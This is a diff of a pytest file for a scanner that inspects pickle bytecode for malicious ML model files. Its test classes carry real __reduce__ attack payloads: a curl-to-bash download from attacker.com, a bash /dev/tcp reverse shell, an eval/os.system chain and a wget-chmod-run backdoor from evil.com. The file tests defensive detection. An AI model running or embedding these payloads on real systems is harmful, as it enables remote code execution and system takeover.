@@ -3,27 +3,26 @@
 All test payloads use REAL attack techniques documented in:
 - Trail of Bits Fickling (2021): pickle __reduce__ RCE
 - HuggingFace security blog (2023): malicious models in the Hub
-- OWASP LLM05: Supply Chain Vulnerabilities
+- OWASP ML06 / LLM03 supply-chain guidance
 
 The scanner parses pickle bytecode via pickletools.genops() without
-ever executing the payload — same approach as production scanners.
+ever executing the payload.
 """
 
 import os
 import pickle
 import subprocess
-import tempfile
 
 import pytest
 
-from src.scanners import scan_pickle_bytes, scan_pickle_file, PickleScanResult
+from src.scanners import scan_pickle_bytes, scan_pickle_file
 
 
 class TestSafePickles:
     """Legitimate ML model pickles must not be flagged."""
 
     def test_plain_dict(self):
-        """A model config dict — no code execution."""
+        """A model config dict with no code execution."""
         data = pickle.dumps({"learning_rate": 0.001, "epochs": 50, "layers": [128, 64, 10]})
         result = scan_pickle_bytes(data)
         assert result.risk_level == "safe"
@@ -32,6 +31,7 @@ class TestSafePickles:
     def test_numpy_array(self):
         """numpy arrays are the most common pickle content in ML."""
         import numpy as np
+
         data = pickle.dumps(np.zeros((10, 768)))  # typical embedding shape
         result = scan_pickle_bytes(data)
         assert result.risk_level == "safe"
@@ -45,12 +45,13 @@ class TestRealAttackPatterns:
     """Real attack patterns from documented supply chain incidents."""
 
     def test_os_system_rce(self):
-        """Classic __reduce__ RCE — the exact pattern found in HuggingFace malicious uploads.
+        """Classic __reduce__ RCE.
 
         On Windows, os.system resolves to nt.system in pickle bytecode.
         On Linux, it resolves to posix.system.
         Both are in our DANGEROUS_MODULES list.
         """
+
         class RCE:
             def __reduce__(self):
                 return (os.system, ("curl http://attacker.com/exfil | bash",))
@@ -61,10 +62,14 @@ class TestRealAttackPatterns:
         assert len(result.findings) >= 2  # dangerous import + REDUCE execution
 
     def test_subprocess_popen_reverse_shell(self):
-        """subprocess.Popen reverse shell — real technique from CTF and incident reports."""
+        """subprocess.Popen reverse shell payload."""
+
         class ReverseShell:
             def __reduce__(self):
-                return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],))
+                return (
+                    subprocess.Popen,
+                    (["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],),
+                )
 
         data = pickle.dumps(ReverseShell())
         result = scan_pickle_bytes(data)
@@ -72,7 +77,8 @@ class TestRealAttackPatterns:
         assert any("subprocess" in imp for imp in result.dangerous_imports)
 
     def test_eval_import_chain(self):
-        """eval(__import__('os').system('cmd')) — obfuscated RCE via builtins."""
+        """eval(__import__('os').system('cmd')) obfuscated RCE via builtins."""
+
         class EvalChain:
             def __reduce__(self):
                 return (eval, ("__import__('os').system('id')",))
@@ -84,9 +90,13 @@ class TestRealAttackPatterns:
 
     def test_multiple_payloads_in_sequence(self):
         """Attacker chaining multiple operations."""
+
         class MultiStage:
             def __reduce__(self):
-                return (os.system, ("wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor",))
+                return (
+                    os.system,
+                    ("wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor",),
+                )
 
         data = pickle.dumps(MultiStage())
         result = scan_pickle_bytes(data)
